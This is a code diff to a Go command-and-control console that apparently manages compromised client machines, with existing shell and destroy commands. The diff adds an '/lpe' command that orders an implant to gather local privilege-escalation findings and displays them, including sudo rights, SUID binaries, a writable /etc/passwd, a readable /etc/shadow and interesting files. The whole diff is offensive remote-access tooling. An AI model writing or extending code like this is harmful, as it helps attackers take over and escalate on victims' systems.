@@ -146,6 +146,15 @@ func removeClient(id int) {
 	}
 }
 
+func printLPECheck(name, value string) {
+	if value == "" {
+		value = "(empty)"
+	}
+	fmt.Printf("%s[%s]%s\n", colorYellow, name, colorReset)
+	fmt.Println(value)
+	fmt.Println()
+}
+
 func printPrompt() {
 	if notifications > 0 {
 		fmt.Printf("%szheng %s[%d]%s> ", colorBold, colorYellow, notifications, colorReset)
@@ -341,6 +350,66 @@ func main() {
 				}
 			}
 
+		case "/lpe":
+			if len(parts) < 2 {
+				fmt.Println("usage: /lpe <client_id>")
+				continue
+			}
+			id, err := strconv.Atoi(parts[1])
+			if err != nil {
+				fmt.Println("invalid client id")
+				continue
+			}
+			c, ok := clients[id]
+			if !ok {
+				fmt.Printf("client %d not found or inactive\n", id)
+				continue
+			}
+			fmt.Printf("%s[*] running LPE checks on client %d (%s@%s)...%s\n",
+				colorCyan, c.ID, c.Recon.Username, c.Recon.Hostname, colorReset)
+			if err := sendCommand(c, "lpe"); err != nil {
+				fmt.Printf("failed to send command: %v\n", err)
+				continue
+			}
+			// Wait for status
+			var statusMsg struct {
+				Status string `json:"status"`
+			}
+			c.Decoder.Decode(&statusMsg)
+			// Read LPE results
+			var lpe struct {
+				OSInfo       string `json:"os_info"`
+				Sudo         string `json:"sudo"`
+				SUID         string `json:"suid"`
+				Cron         string `json:"cron"`
+				Capabilities string `json:"capabilities"`
+				Docker       string `json:"docker"`
+				PATH         string `json:"path_writable"`
+				Passwd       string `json:"passwd_writable"`
+				Shadow       string `json:"shadow_readable"`
+				WorldWrite   string `json:"world_writable"`
+				Interesting  string `json:"interesting_files"`
+			}
+			if err := c.Decoder.Decode(&lpe); err != nil {
+				fmt.Printf("connection lost: %v\n", err)
+				continue
+			}
+			fmt.Println()
+			fmt.Printf("%s=== LPE RESULTS for %s@%s ===%s\n", colorBold, c.Recon.Username, c.Recon.Hostname, colorReset)
+			fmt.Println()
+			printLPECheck("OS Info", lpe.OSInfo)
+			printLPECheck("Sudo", lpe.Sudo)
+			printLPECheck("SUID Binaries", lpe.SUID)
+			printLPECheck("Cron", lpe.Cron)
+			printLPECheck("Capabilities", lpe.Capabilities)
+			printLPECheck("Docker", lpe.Docker)
+			printLPECheck("Writable PATH dirs", lpe.PATH)
+			printLPECheck("/etc/passwd writable", lpe.Passwd)
+			printLPECheck("/etc/shadow readable", lpe.Shadow)
+			printLPECheck("World-writable files", lpe.WorldWrite)
+			printLPECheck("Interesting files", lpe.Interesting)
+			fmt.Println()
+
 		case "/clear":
 			fmt.Print("\033[H\033[2J")
 
@@ -387,7 +456,7 @@ func main() {
 
 		default:
 			fmt.Printf("unknown command: %s\n", cmd)
-			fmt.Println("commands: /clients, /shell <id>, /destroy <id>, /clear, /done")
+			fmt.Println("commands: /clients, /shell <id>, /lpe <id>, /destroy <id>, /clear, /done")
 		}
 	}
 }
